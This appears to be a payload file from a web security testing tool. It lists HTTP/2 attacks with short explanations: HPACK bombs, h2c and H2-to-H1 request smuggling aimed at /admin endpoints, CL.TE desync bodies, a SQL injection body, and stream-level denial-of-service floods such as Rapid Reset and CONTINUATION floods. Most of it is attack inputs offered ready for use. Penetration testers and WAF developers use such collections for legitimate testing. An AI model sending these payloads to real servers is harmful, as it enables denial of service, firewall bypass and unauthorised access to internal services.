description: HTTP/2 specific attack payloads — HPACK bomb, pseudo-header smuggling, stream manipulation, H2C smuggling, and protocol-level bypasses

payloads.description: HPACK bomb — oversized header value to exhaust HPACK dynamic table memory. Sends a single header with ~1000 bytes that compresses to a small frame but expands on decompression.

payloads.payload:
X-Bomb-1: AAAA
X-Bomb-2: AAAA
X-Bomb-3: AAAA
X-Bomb-4: AAAA
X-Bomb-5: AAAA
X-Bomb-6: AAAA
X-Bomb-7: AAAA
X-Bomb-8: AAAA
X-Bomb-9: AAAA
X-Bomb-10: AAAA
X-Bomb-11: AAAA
X-Bomb-12: AAAA
X-Bomb-13: AAAA
X-Bomb-14: AAAA
X-Bomb-15: AAAA
X-Bomb-16: AAAA
X-Bomb-17: AAAA
X-Bomb-18: AAAA
X-Bomb-19: AAAA
X-Bomb-20: AAAA
payloads.description: HPACK table pollution — 20 unique header names to fill the HPACK dynamic table and evict legitimate entries, causing decompression failures on subsequent requests.
HTTP/2 pseudo-header smuggling — inject :authority targeting an internal host. H2-to-H1 downgrade proxies may translate this to a Host header pointing to internal services.
H2-to-H1 request smuggling via :path — inject HTTP/1.1 request line into H2 :path pseudo-header. Downgrade proxy may parse the embedded H1 request.
H2 Transfer-Encoding injection — HTTP/2 forbids Transfer-Encoding but some proxies pass it through during H2→H1 downgrade, enabling CL.TE smuggling.
H2 path traversal via :path pseudo-header — some H2 implementations don't normalize the :path before forwarding, allowing directory traversal.

payloads.payload:
GET / HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
payloads.description: H2C smuggling — upgrade cleartext HTTP/1.1 to HTTP/2 via Upgrade header. Reverse proxies may forward the upgraded connection directly to backend, bypassing WAF inspection.

payloads.payload:
GET /admin HTTP/1.1
Host: target.com
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
X-Forwarded-For: 127.0.0.1
payloads.description: H2C smuggling to internal admin — combine H2C upgrade with X-Forwarded-For to access internal admin endpoints that trust proxy headers.

payloads.payload: PRIORITY frame: stream_id=1, weight=256, dep_stream=0, exclusive=1
payloads.description: HTTP/2 stream priority manipulation — set excessive weight and exclusive dependency to starve other streams. Can cause DoS on H2 multiplexed connections.
HTTP/2 Rapid Reset (CVE-2023-44487) — open streams then immediately RST_STREAM them. Server allocates resources per stream but client cancels before response, causing resource exhaustion.
HTTP/2 SETTINGS abuse — set max concurrent streams to 0 and initial window size to 0, forcing server into a stuck state where it cannot send data.
HPACK dynamic table eviction — set SETTINGS_HEADER_TABLE_SIZE to 0, forcing the server to evict all HPACK entries and re-send headers uncompressed, increasing bandwidth.
H2 header order violation — place a regular header before pseudo-headers. Some H2 parsers accept this while WAFs may reject or misparse it.
H2 duplicate Host — send both :authority and host header. H2 spec says :authority takes precedence, but some backends may use host header instead.
H2 hop-by-hop header abuse — inject rewrite headers in H2 that may bypass WAF rules when downgraded to H1.
H2 duplicate Content-Length — send two CL headers in H2 frame. H2 allows this in some implementations, causing CL confusion on H2→H1 downgrade.
XSS via H2 :path — embed XSS payload in the :path pseudo-header. Some WAFs only inspect H1 query strings but miss H2 pseudo-header values.

payloads.payload:
:method: POST
:path: /api
:authority: target.com
content-type: application/x-www-form-urlencoded

q=' OR 1=1--
payloads.description: SQLi via H2 POST body — WAFs may have different inspection depth for H2 DATA frames vs H1 request bodies.
H2 URL-encoded path traversal — H2 proxies may not decode :path before forwarding, but origin servers do, allowing path traversal.
XSS in H2 custom header — inject XSS in a custom header that gets reflected in error pages or logs. H2 binary framing may bypass WAF string matching.

payloads.payload: CONTINUATION frame flood: 10000 frames, each with 1 byte header fragment
payloads.description: HTTP/2 CONTINUATION flood (CVE-2024-27983) — send thousands of CONTINUATION frames without END_HEADERS flag. Server must buffer all fragments before processing, causing memory exhaustion.

payloads.payload: HEADERS frame (no END_HEADERS) + 1000x CONTINUATION frames with padding
payloads.description: CONTINUATION flood with padding — add maximum padding to each CONTINUATION frame to amplify memory consumption on the server side.
HTTP/2 flow control abuse — send maximum WINDOW_UPDATE on connection stream (id=0) to signal infinite receive capacity, then never consume data, causing server buffer bloat.

payloads.payload: PING frame flood: 10000 PING frames in rapid succession
payloads.description: HTTP/2 PING flood — send thousands of PING frames. Server must respond to each with PING ACK, causing CPU exhaustion on the server.
GOAWAY frame with XSS in debug data — inject XSS in GOAWAY debug_data field. If debug data is logged or displayed in admin panels, XSS may trigger.
HTTP/2 connection preface — send the H2 magic bytes on an HTTP/1.1 port. Some servers may crash or enter an undefined state when receiving unexpected H2 preface.
H2 CONNECT tunneling — use H2 CONNECT method to tunnel to internal services. Some proxies allow CONNECT in H2 without proper authorization checks.
H2 Extended CONNECT for WebSocket (RFC 8441) — attempt to upgrade H2 connection to WebSocket, potentially bypassing WAF rules that don't inspect WebSocket frames.

payloads.payload:
:method: POST
:path: /
content-length: 4

GET /admin HTTP/1.1
Host: target.com
payloads.description: H2 request desync — send mismatched Content-Length in H2 followed by smuggled H1 request in DATA frame. H2-to-H1 downgrade may forward the embedded request.

payloads.payload:
:method: POST
:path: /
transfer-encoding: chunked
content-length: 5

0

GET /admin HTTP/1.1
Host: target.com
payloads.description: H2 CL+TE desync — combine Content-Length and Transfer-Encoding in H2 request (both forbidden in H2 spec). Downgrade proxies may pass both through, creating classic CL.TE smuggling.
H2 header CRLF injection — inject CRLF into header value. H2 binary framing should prevent this but some H2-to-H1 downgrades fail to sanitize header values.
GraphQL introspection via H2 with mismatched Content-Type — send JSON body with text/plain Content-Type in H2. WAF may skip JSON inspection based on Content-Type.
